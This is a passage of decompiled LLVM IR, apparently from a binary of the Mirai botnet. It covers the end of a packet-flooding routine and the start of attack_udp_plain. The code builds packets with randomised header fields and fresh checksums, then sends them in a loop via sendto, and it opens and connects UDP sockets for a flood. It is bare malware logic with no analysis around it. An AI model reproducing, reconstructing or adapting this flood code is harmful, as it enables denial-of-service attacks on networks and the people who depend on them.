  %v3_c9b0 = icmp eq i32 %v6_c55c, -1
  %v8_c9b0 = icmp eq i32 %v6_c55c, -1
  %v3_c880 = icmp eq i32 %v3_c5c4, 65535
  br label %dec_label_pc_c834

dec_label_pc_c834:                                ; preds = %dec_label_pc_c834, %dec_label_pc_c944, %dec_label_pc_c834.preheader
  %v0_c838 = phi i32 [ %v0_c8386, %dec_label_pc_c834.preheader ], [ 0, %dec_label_pc_c944 ], [ 0, %dec_label_pc_c834 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c838 = icmp eq i32 %v0_c838, 0
  store i1 %v2_c838, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c838, label %dec_label_pc_c834, label %dec_label_pc_c844

dec_label_pc_c844:                                ; preds = %dec_label_pc_c834, %dec_label_pc_c944
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c848

dec_label_pc_c848:                                ; preds = %dec_label_pc_c8c0, %dec_label_pc_c844
  %v1_c858 = phi i32 [ %v1_c934, %dec_label_pc_c8c0 ], [ 0, %dec_label_pc_c844 ]
  %v5_c84c = mul i32 %v1_c858, 24
  %v1_c850 = load i32, i32* @r8, align 4
  %v2_c850 = add i32 %v1_c850, %v5_c84c
  store i32 %v2_c850, i32* %r3.global-to-local, align 4
  %v1_c854 = add i32 %v2_c850, 20
  %v2_c854 = inttoptr i32 %v1_c854 to i8*
  %v3_c854 = load i8, i8* %v2_c854, align 1
  %v4_c854 = zext i8 %v3_c854 to i32
  store i32 %v4_c854, i32* %r2.global-to-local, align 4
  %v0_c858 = load i32, i32* @sb, align 4
  %v4_c858 = mul i32 %v1_c858, 4
  %v5_c858 = add i32 %v0_c858, %v4_c858
  %v6_c858 = inttoptr i32 %v5_c858 to i32*
  %v7_c858 = load i32, i32* %v6_c858, align 4
  store i32 %v7_c858, i32* @r5, align 4
  %v7_c85c = icmp eq i8 %v3_c854, 31
  store i1 %v7_c85c, i1* %cpsr_z.global-to-local, align 1
  %v1_c860 = add i32 %v7_c858, 20
  store i32 %v1_c860, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c854, 32
  br i1 %tmp67, label %dec_label_pc_c958, label %dec_label_pc_c868

dec_label_pc_c868:                                ; preds = %dec_label_pc_c848
  store i32 %v6_c55c, i32* %r3.global-to-local, align 4
  store i1 %v8_c9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c9b0, label %dec_label_pc_c9b8, label %dec_label_pc_c874

dec_label_pc_c874:                                ; preds = %dec_label_pc_c958, %dec_label_pc_c868
  store i32 %v3_c5c4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c880, label %dec_label_pc_c9d4, label %dec_label_pc_c888

dec_label_pc_c888:                                ; preds = %dec_label_pc_c9b8, %dec_label_pc_c874
  %v1_c88c = phi i32 [ %v1_c9c8, %dec_label_pc_c9b8 ], [ 65535, %dec_label_pc_c874 ]
  store i32 %v3_c5c8, i32* %r1.global-to-local, align 4
  %v9_c88c = icmp eq i32 %v3_c5c8, %v1_c88c
  store i1 %v9_c88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c88c, label %dec_label_pc_c9e8, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %dec_label_pc_c9d4.dec_label_pc_c894_crit_edge, %dec_label_pc_c888
  %v1_c898 = phi i32 [ %v1_c898.pre, %dec_label_pc_c9d4.dec_label_pc_c894_crit_edge ], [ %v1_c88c, %dec_label_pc_c888 ]
  store i32 %v3_c5cc, i32* %r2.global-to-local, align 4
  %v9_c898 = icmp eq i32 %v3_c5cc, %v1_c898
  store i1 %v9_c898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c898, label %dec_label_pc_c9fc, label %dec_label_pc_c8a0

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c9e8.dec_label_pc_c8a0_crit_edge, %dec_label_pc_c894
  %v1_c8a4 = phi i32 [ %v1_c8a4.pre, %dec_label_pc_c9e8.dec_label_pc_c8a0_crit_edge ], [ %v1_c898, %dec_label_pc_c894 ]
  store i32 %v5_c498, i32* %r3.global-to-local, align 4
  %v9_c8a4 = icmp eq i32 %v5_c498, %v1_c8a4
  store i1 %v9_c8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c8a4, label %dec_label_pc_ca10, label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %dec_label_pc_c9fc.dec_label_pc_c8ac_crit_edge, %dec_label_pc_c8a0
  %v1_c8b0 = phi i32 [ %v1_c8b0.pre, %dec_label_pc_c9fc.dec_label_pc_c8ac_crit_edge ], [ %v1_c8a4, %dec_label_pc_c8a0 ]
  store i32 %v6_c4b0, i32* %r0.global-to-local, align 4
  %v9_c8b0 = icmp eq i32 %v6_c4b0, %v1_c8b0
  store i1 %v9_c8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c8b0, label %dec_label_pc_ca24, label %dec_label_pc_c8b8

dec_label_pc_c8b8:                                ; preds = %dec_label_pc_ca10, %dec_label_pc_c8ac
  %v0_c8b8 = load i32, i32* @fp, align 4
  %v2_c8b8 = icmp eq i32 %v0_c8b8, 0
  store i1 %v2_c8b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c8b8, label %dec_label_pc_c8c0, label %dec_label_pc_ca34

dec_label_pc_c8c0:                                ; preds = %dec_label_pc_c8b8, %dec_label_pc_ca24, %dec_label_pc_ca34
  %v2_c8c4 = load i32, i32* @r5, align 4
  %v3_c8c4 = add i32 %v2_c8c4, 10
  %v4_c8c4 = inttoptr i32 %v3_c8c4 to i16*
  store i16 0, i16* %v4_c8c4, align 2
  %v0_c8c8 = load i32, i32* @r5, align 4
  store i32 %v0_c8c8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c8d0 = call i32 @checksum_generic(i32 %v0_c8c8, i32 20)
  %v3_c8d0 = trunc i32 %v2_c8d0 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c8d8 = load i32, i32* @r5, align 4
  %v4_c8d8 = add i32 %v3_c8d8, 10
  %v5_c8d8 = inttoptr i32 %v4_c8d8 to i16*
  store i16 %v3_c8d0, i16* %v5_c8d8, align 2
  %v0_c8dc = load i32, i32* @r6, align 4
  store i32 %v0_c8dc, i32* @r1, align 4
  %v0_c8e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c8e0 = trunc i32 %v0_c8e0 to i16
  %v3_c8e0 = add i32 %v0_c8dc, 16
  %v4_c8e0 = inttoptr i32 %v3_c8e0 to i16*
  store i16 %v1_c8e0, i16* %v4_c8e0, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c8ec = load i32, i32* @r5, align 4
  store i32 %v0_c8ec, i32* %r0.global-to-local, align 4
  %v4_c8f0 = call i32 @checksum_tcpudp(i32 %v0_c8ec, i32 %v0_c8dc, i32 10240, i32 40)
  %v5_c8f0 = trunc i32 %v4_c8f0 to i16
  store i32 %v4_c8f0, i32* %r0.global-to-local, align 4
  %v3_c8f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c8f4, i32* %r3.global-to-local, align 4
  %v3_c8f8 = mul i32 %v3_c8f4, 32
  store i32 %v3_c8f8, i32* %lr.global-to-local, align 4
  %v3_c8fc = load i32, i32* @r6, align 4
  %v4_c8fc = add i32 %v3_c8fc, 16
  %v5_c8fc = inttoptr i32 %v4_c8fc to i16*
  store i16 %v5_c8f0, i16* %v5_c8fc, align 2
  %v0_c900 = load i32, i32* %lr.global-to-local, align 4
  %v1_c900 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c900, -8
  %v5_c900 = add i32 %v0_c900, %tmp68
  store i32 %v5_c900, i32* %lr.global-to-local, align 4
  %v0_c904 = load i32, i32* @r6, align 4
  %v1_c904 = add i32 %v0_c904, 2
  %v2_c904 = inttoptr i32 %v1_c904 to i16*
  %v3_c904 = load i16, i16* %v2_c904, align 2
  %v4_c904 = zext i16 %v3_c904 to i32
  store i32 %v4_c904, i32* @r6, align 4
  %v1_c908 = load i32, i32* @r8, align 4
  %v2_c908 = add i32 %v1_c908, %v5_c900
  store i32 %v2_c908, i32* @lr, align 4
  %v3_c90c = add i32 %v2_c908, 2
  %v4_c90c = inttoptr i32 %v3_c90c to i16*
  store i16 %v3_c904, i16* %v4_c90c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c918 = load i32, i32* @r5, align 4
  store i32 %v0_c918, i32* %r1.global-to-local, align 4
  %v0_c91c = load i32, i32* @sl, align 4
  store i32 %v0_c91c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c924 = load i32, i32* @lr, align 4
  %v6_c92c = call i32 @__libc_sendto(i32 %v0_c91c, i32 %v0_c918, i32 60, i32 16384, i32 %v0_c924, i32 16)
  %v3_c930 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c930, i32* %r3.global-to-local, align 4
  %v1_c934 = add i32 %v3_c930, 1
  store i32 %v1_c934, i32* %r0.global-to-local, align 4
  %v1_c938 = load i32, i32* @r7, align 4
  %v9_c938 = icmp eq i32 %v1_c934, %v1_c938
  store i1 %v9_c938, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c934, i32* %stack_var_-44, align 4
  %v5_c940 = icmp slt i32 %v1_c934, %v1_c938
  br i1 %v5_c940, label %dec_label_pc_c848, label %dec_label_pc_c944

dec_label_pc_c944:                                ; preds = %dec_label_pc_c8c0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c948 = icmp eq i32 %v1_c938, 0
  store i1 %v2_c948, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c948, label %dec_label_pc_c834, label %dec_label_pc_c844

dec_label_pc_c958:                                ; preds = %dec_label_pc_c848
  %v1_c958 = add i32 %v2_c850, 16
  %v2_c958 = inttoptr i32 %v1_c958 to i32*
  %v3_c958 = load i32, i32* %v2_c958, align 4
  store i32 %v3_c958, i32* %r4.global-to-local, align 4
  %v0_c95c = call i32 @rand_next()
  store i32 %v0_c95c, i32* %r0.global-to-local, align 4
  %v3_c960 = load i32, i32* %stack_var_-44, align 4
  %v5_c968 = mul i32 %v3_c960, 24
  %v0_c96c = load i32, i32* %r4.global-to-local, align 4
  %v1_c96c = and i32 %v0_c96c, 16711680
  %v3_c970 = udiv i32 %v0_c96c, 16777216
  %v4_c974 = udiv i32 %v1_c96c, 256
  %v5_c974 = or i32 %v4_c974, %v3_c970
  store i32 %v5_c974, i32* %r2.global-to-local, align 4
  %v1_c978 = load i32, i32* @r8, align 4
  %v2_c978 = add i32 %v1_c978, %v5_c968
  store i32 %v2_c978, i32* %r1.global-to-local, align 4
  %v1_c97c = and i32 %v0_c96c, 65280
  store i32 %v1_c97c, i32* %r3.global-to-local, align 4
  %v1_c980 = add i32 %v2_c978, 20
  %v2_c980 = inttoptr i32 %v1_c980 to i8*
  %v3_c980 = load i8, i8* %v2_c980, align 1
  %v4_c980 = zext i8 %v3_c980 to i32
  %v5_c988 = call i32 @llvm.bswap.i32(i32 %v0_c96c)
  %v7_c98c = lshr i32 %v0_c95c, %v4_c980
  %v8_c98c = add i32 %v7_c98c, %v5_c988
  store i32 %v8_c98c, i32* %r2.global-to-local, align 4
  %v1_c990 = and i32 %v8_c98c, 16711680
  store i32 %v1_c990, i32* %r0.global-to-local, align 4
  %v1_c99c = and i32 %v8_c98c, 65280
  store i32 %v1_c99c, i32* %r1.global-to-local, align 4
  %v5_c9a4 = call i32 @llvm.bswap.i32(i32 %v8_c98c)
  %v1_c9a8 = load i32, i32* @r5, align 4
  %v2_c9a8 = add i32 %v1_c9a8, 16
  %v3_c9a8 = inttoptr i32 %v2_c9a8 to i32*
  store i32 %v5_c9a4, i32* %v3_c9a8, align 4
  store i32 %v6_c55c, i32* %r3.global-to-local, align 4
  store i1 %v8_c9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c9b0, label %dec_label_pc_c9b8, label %dec_label_pc_c874

dec_label_pc_c9b8:                                ; preds = %dec_label_pc_c958, %dec_label_pc_c868
  %v0_c9b8 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c9c0 = load i32, i32* @r5, align 4
  %v2_c9c0 = add i32 %v1_c9c0, 12
  %v3_c9c0 = inttoptr i32 %v2_c9c0 to i32*
  store i32 %v0_c9b8, i32* %v3_c9c0, align 4
  store i32 %v3_c5c4, i32* %r0.global-to-local, align 4
  %v0_c9c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c9c8 = add i32 %v0_c9c8, -1
  store i32 %v1_c9c8, i32* @r4, align 4
  %v9_c9cc = icmp eq i32 %v3_c5c4, %v1_c9c8
  store i1 %v9_c9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c9cc, label %dec_label_pc_c9d4, label %dec_label_pc_c888

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c9b8, %dec_label_pc_c874
  %v0_c9d4 = call i32 @rand_next()
  %v1_c9d4 = trunc i32 %v0_c9d4 to i16
  store i32 %v0_c9d4, i32* %r0.global-to-local, align 4
  store i32 %v3_c5c8, i32* %r1.global-to-local, align 4
  %v1_c9dc = load i32, i32* @r4, align 4
  %v9_c9dc = icmp eq i32 %v3_c5c8, %v1_c9dc
  store i1 %v9_c9dc, i1* %cpsr_z.global-to-local, align 1
  %v3_c9e0 = load i32, i32* @r5, align 4
  %v4_c9e0 = add i32 %v3_c9e0, 4
  %v5_c9e0 = inttoptr i32 %v4_c9e0 to i16*
  store i16 %v1_c9d4, i16* %v5_c9e0, align 2
  br i1 %v9_c9dc, label %dec_label_pc_c9e8, label %dec_label_pc_c9d4.dec_label_pc_c894_crit_edge

dec_label_pc_c9d4.dec_label_pc_c894_crit_edge:    ; preds = %dec_label_pc_c9d4
  %v1_c898.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c894

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c9d4, %dec_label_pc_c888
  %v0_c9e8 = call i32 @rand_next()
  %v1_c9e8 = trunc i32 %v0_c9e8 to i16
  store i32 %v0_c9e8, i32* %r0.global-to-local, align 4
  store i32 %v3_c5cc, i32* %r2.global-to-local, align 4
  %v1_c9f0 = load i32, i32* @r4, align 4
  %v9_c9f0 = icmp eq i32 %v3_c5cc, %v1_c9f0
  store i1 %v9_c9f0, i1* %cpsr_z.global-to-local, align 1
  %v3_c9f4 = load i32, i32* @r5, align 4
  %v4_c9f4 = add i32 %v3_c9f4, 20
  %v5_c9f4 = inttoptr i32 %v4_c9f4 to i16*
  store i16 %v1_c9e8, i16* %v5_c9f4, align 2
  br i1 %v9_c9f0, label %dec_label_pc_c9fc, label %dec_label_pc_c9e8.dec_label_pc_c8a0_crit_edge

dec_label_pc_c9e8.dec_label_pc_c8a0_crit_edge:    ; preds = %dec_label_pc_c9e8
  %v1_c8a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c8a0

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9e8, %dec_label_pc_c894
  %v0_c9fc = call i32 @rand_next()
  %v1_c9fc = trunc i32 %v0_c9fc to i16
  store i32 %v0_c9fc, i32* %r0.global-to-local, align 4
  store i32 %v5_c498, i32* %r3.global-to-local, align 4
  %v1_ca04 = load i32, i32* @r4, align 4
  %v9_ca04 = icmp eq i32 %v5_c498, %v1_ca04
  store i1 %v9_ca04, i1* %cpsr_z.global-to-local, align 1
  %v3_ca08 = load i32, i32* @r6, align 4
  %v4_ca08 = add i32 %v3_ca08, 2
  %v5_ca08 = inttoptr i32 %v4_ca08 to i16*
  store i16 %v1_c9fc, i16* %v5_ca08, align 2
  br i1 %v9_ca04, label %dec_label_pc_ca10, label %dec_label_pc_c9fc.dec_label_pc_c8ac_crit_edge

dec_label_pc_c9fc.dec_label_pc_c8ac_crit_edge:    ; preds = %dec_label_pc_c9fc
  %v1_c8b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c8ac

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c9fc, %dec_label_pc_c8a0
  %v0_ca10 = call i32 @rand_next()
  %v1_ca14 = load i32, i32* @r6, align 4
  %v2_ca14 = add i32 %v1_ca14, 4
  %v3_ca14 = inttoptr i32 %v2_ca14 to i32*
  store i32 %v0_ca10, i32* %v3_ca14, align 4
  store i32 %v6_c4b0, i32* %r0.global-to-local, align 4
  %v1_ca1c = load i32, i32* @r4, align 4
  %v9_ca1c = icmp eq i32 %v6_c4b0, %v1_ca1c
  store i1 %v9_ca1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ca1c, label %dec_label_pc_ca24, label %dec_label_pc_c8b8

dec_label_pc_ca24:                                ; preds = %dec_label_pc_ca10, %dec_label_pc_c8ac
  %v0_ca24 = call i32 @rand_next()
  store i32 %v0_ca24, i32* %r0.global-to-local, align 4
  %v0_ca28 = load i32, i32* @fp, align 4
  %v2_ca28 = icmp eq i32 %v0_ca28, 0
  store i1 %v2_ca28, i1* %cpsr_z.global-to-local, align 1
  %v1_ca2c = load i32, i32* @r6, align 4
  %v2_ca2c = add i32 %v1_ca2c, 8
  %v3_ca2c = inttoptr i32 %v2_ca2c to i32*
  store i32 %v0_ca24, i32* %v3_ca2c, align 4
  br i1 %v2_ca28, label %dec_label_pc_c8c0, label %dec_label_pc_ca34

dec_label_pc_ca34:                                ; preds = %dec_label_pc_c8b8, %dec_label_pc_ca24
  %v0_ca34 = call i32 @rand_next()
  %v1_ca34 = trunc i32 %v0_ca34 to i16
  store i32 %v0_ca34, i32* %r0.global-to-local, align 4
  %v3_ca38 = load i32, i32* @r6, align 4
  %v4_ca38 = add i32 %v3_ca38, 18
  %v5_ca38 = inttoptr i32 %v4_ca38 to i16*
  store i16 %v1_ca34, i16* %v5_ca38, align 2
  br label %dec_label_pc_c8c0

dec_label_pc_ca40:                                ; preds = %dec_label_pc_c580
  %v0_ca40 = load i32, i32* @sl, align 4
  store i32 %v0_ca40, i32* %r0.global-to-local, align 4
  %v1_ca44 = call i32 @__GI___libc_close(i32 %v0_ca40)
  store i32 %v1_ca44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ca48

dec_label_pc_ca48:                                ; preds = %entry, %dec_label_pc_ca40
  %v1_ca50 = phi i32 [ %v3_c570, %entry ], [ %v1_ca44, %dec_label_pc_ca40 ]
  store i32 %v3_c3ac, i32* %r4.global-to-local, align 4
  store i32 %v24_c3ac, i32* %fp.global-to-local, align 4
  store i32 %v27_c3ac, i32* %lr.global-to-local, align 4
  ret i32 %v1_ca50

; uselistorder directives
  uselistorder i32 %v0_ca34, { 1, 0 }
  uselistorder i32 %v0_c9fc, { 1, 0 }
  uselistorder i32 %v0_c9e8, { 1, 0 }
  uselistorder i32 %v0_c9d4, { 1, 0 }
  uselistorder i32 %v1_c9c8, { 1, 2, 0 }
  uselistorder i32 %v0_c96c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c934, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c900, { 1, 0 }
  uselistorder i32 %v4_c8f0, { 1, 0 }
  uselistorder i1 %v3_c880, { 1, 0 }
  uselistorder i32 %v2_c824, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c68c, { 1, 2, 0 }
  uselistorder i32 %v1_c658, { 2, 1, 0 }
  uselistorder i32 %v1_c654, { 2, 0, 1 }
  uselistorder i32 %v1_c650, { 2, 0, 1 }
  uselistorder i32 %v1_c64c, { 2, 0, 1 }
  uselistorder i32 %v1_c628, { 1, 0 }
  uselistorder i32 %v3_c5c4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c5b8, { 1, 0, 2 }
  uselistorder i32 %v0_c5b4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c5a0, { 1, 0 }
  uselistorder i1 %v7_c574, { 1, 0 }
  uselistorder i32 %v3_c570, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c55c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c4b0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c498, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c41c, { 1, 0 }
  uselistorder i32 %v7_c404, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 45, { 2, 0, 3, 1, 4 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i8 4, { 3, 2, 1, 0 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca48, { 1, 0 }
  uselistorder label %dec_label_pc_ca34, { 1, 0 }
  uselistorder label %dec_label_pc_c8c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c844, { 1, 0 }
  uselistorder label %dec_label_pc_c834, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_ca58 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_ca74 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_ca74, i32* @sl, align 4
  %v0_ca80 = load i32, i32* @r7, align 4
  %v2_ca84 = call i32 @calloc(i32 %v0_ca80, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_ca90 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_ca84, i32* @r8, align 4
  %v0_caa0 = load i32, i32* @r5, align 4
  %v4_caa4 = inttoptr i32 %v0_ca90 to i32*
  %v5_caa4 = call i32 @attack_get_opt_int(i32 %v0_caa0, i32* %v4_caa4, i32 7, i32 65535)
  %v3_caac = urem i32 %v5_caa4, 65536
  %v0_cab0 = load i32, i32* @r6, align 4
  %v0_cab8 = load i32, i32* @r4, align 4
  store i32 %v0_cab8, i32* %r3.global-to-local, align 4
  %v0_cabc = load i32, i32* @r5, align 4
  %v5_cac4 = inttoptr i32 %v0_cab0 to i32*
  %v6_cac4 = call i32 @attack_get_opt_int(i32 %v0_cabc, i32* %v5_cac4, i32 6, i32 %v0_cab8)
  %v0_cac8 = load i32, i32* @r6, align 4
  %v3_cacc = mul i32 %v6_cac4, 65536
  store i32 %v3_cacc, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_cad8 = load i32, i32* @r5, align 4
  %v4_cadc = inttoptr i32 %v0_cac8 to i32*
  %v5_cadc = call i32 @attack_get_opt_int(i32 %v0_cad8, i32* %v4_cadc, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_caec = load i32, i32* @r6, align 4
  %v0_caf0 = load i32, i32* @r5, align 4
  %v3_caf4 = urem i32 %v5_cadc, 65536
  store i32 %v3_caf4, i32* @r5, align 4
  %v4_caf8 = inttoptr i32 %v0_caec to i32*
  %v5_caf8 = call i32 @attack_get_opt_int(i32 %v0_caf0, i32* %v4_caf8, i32 1, i32 1)
  %v0_cafc = load i32, i32* %sb.global-to-local, align 4
  %v3_cafc = udiv i32 %v0_cafc, 65536
  store i32 %v3_cafc, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_cb04 = load i32, i32* @r4, align 4
  %v9_cb04 = icmp eq i32 %v3_cafc, %v1_cb04
  br i1 %v9_cb04, label %dec_label_pc_cb34, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_cb1c = udiv i32 %v0_cafc, 16777216
  store i32 %v4_cb1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cb44

dec_label_pc_cb34:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_cb34 = call i32 @rand_next()
  br label %dec_label_pc_cb44

dec_label_pc_cb44:                                ; preds = %bb, %dec_label_pc_cb34
  %v0_cb2810 = urem i32 %v5_caf8, 256
  %v0_cb44 = load i32, i32* @r7, align 4
  %v2_cb44 = icmp eq i32 %v0_cb44, 0
  br i1 %v2_cb44, label %dec_label_pc_cc84, label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb44
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_cbf8 = udiv i32 %v3_caac, 256
  %v1_cbf4 = mul i32 %v5_caa4, 256
  %v4_cbfc = and i32 %v1_cbf4, 65280
  %v5_cbfc = or i32 %v4_cbfc, %v3_cbf8
  %v2_cb7c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_cbdc

dec_label_pc_cb5c:                                ; preds = %bb51, %dec_label_pc_cc1c
  %v3_cb68 = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_cb70 = icmp eq i32 %v3_cb68, -1
  %v0_cb74 = load i32, i32* @sb, align 4
  %v1_cb74 = add i32 %v0_cb74, 1
  store i32 %v1_cb74, i32* @sb, align 4
  %v0_cb78 = load i32, i32* @fp, align 4
  %v1_cb78 = add i32 %v0_cb78, 24
  store i32 %v1_cb78, i32* @fp, align 4
  %v2_cb84 = load i32, i32* @r8, align 4
  %v3_cb84 = add i32 %v2_cb84, %stack_var_-60.0
  %v4_cb84 = inttoptr i32 %v3_cb84 to i32*
  store i32 %v3_cb68, i32* %v4_cb84, align 4
  br i1 %v7_cb70, label %dec_label_pc_cc78, label %dec_label_pc_cb8c

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb5c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_cba4 = call i32 @bind(i32 %v3_cb68, i32 %v2_cb7c, i32 16)
  %v0_cba8 = load i32, i32* @r6, align 4
  %v1_cba8 = add i32 %v0_cba8, 20
  %v2_cba8 = inttoptr i32 %v1_cba8 to i8*
  %v3_cba8 = load i8, i8* %v2_cba8, align 1
  %v4_cba8 = zext i8 %v3_cba8 to i32
  store i32 %v4_cba8, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_cba8, 32
  br i1 %tmp, label %dec_label_pc_cc30, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cc30
  %v0_cbb8 = phi i32 [ %v0_cba8, %dec_label_pc_cb8c ], [ %v0_cbb8.pre, %dec_label_pc_cc30 ]
  %v1_cbbc = load i32, i32* @r8, align 4
  %v2_cbbc = add i32 %v1_cbbc, %stack_var_-60.0
  %v3_cbbc = inttoptr i32 %v2_cbbc to i32*
  %v4_cbbc = load i32, i32* %v3_cbbc, align 4
  %v3_cbc4 = call i32 @__libc_connect(i32 %v4_cbbc, i32 %v0_cbb8, i32 16)
  %v0_cbcc = load i32, i32* @sb, align 4
  %v1_cbcc = load i32, i32* @r7, align 4
  %v9_cbcc = icmp eq i32 %v0_cbcc, %v1_cbcc
  %v1_cbd0 = add i32 %stack_var_-60.0, 4
  store i32 %v1_cbd0, i32* %r3.global-to-local, align 4
  br i1 %v9_cbcc, label %dec_label_pc_cc84, label %dec_label_pc_cbdc

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cbb4, %dec_label_pc_cb4c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_cb4c ], [ %v1_cbd0, %dec_label_pc_cbb4 ]
  store i32 65535, i32* @r4, align 4
  %v2_cbec = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_cbfc, i32* %r3.global-to-local, align 4
  %v1_cc08 = load i32, i32* @r4, align 4
  %v9_cc08 = icmp eq i32 %v3_caac, %v1_cc08
  %v1_cc0c = load i32, i32* @fp, align 4
  %v2_cc0c = add i32 %v1_cc0c, %arg2
  store i32 %v2_cc0c, i32* @r6, align 4
